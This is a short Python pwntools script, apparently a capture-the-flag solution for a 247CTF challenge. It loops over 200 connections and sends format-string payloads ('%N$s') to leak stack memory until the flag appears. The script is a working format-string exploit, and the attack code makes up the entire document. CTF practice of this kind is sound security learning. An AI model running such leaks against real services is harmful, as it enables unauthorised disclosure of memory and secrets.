from pwn import *

host, port = "05d4bb95819b7835.247ctf.com", 50125


for i in range(200):
    conn = remote(host, port)
    conn.recvuntil(b"again?\n")
    conn.sendline(f"%{i}$s".encode())
    flag = conn.recv()

    try:
        print(flag)
    except Exception as e:
        conn.close()

conn.interactive()
